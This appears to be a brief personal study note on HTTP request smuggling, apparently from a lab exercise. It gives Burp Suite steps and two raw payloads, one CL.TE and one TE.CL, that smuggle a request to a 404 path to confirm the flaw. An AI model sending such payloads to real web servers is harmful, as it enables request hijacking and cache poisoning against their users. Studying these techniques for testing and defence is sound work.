____

HTTP /1
Change request method 

We have to receive HTTP /1 200 OK 

Extension: HTTP Request Smuggler -> Launch all scans
# CL.TE

```
Content-Length: 0
Transfer-encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

Sent 2 times. The 2nd time 404

x= 
# TE.CL

Repeater --> uncheck Update Content-Length

```
Content-Length: 4
Transfer-encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

![[Pasted image 20240814132824.png]]

![[Pasted image 20240814132925.png]]






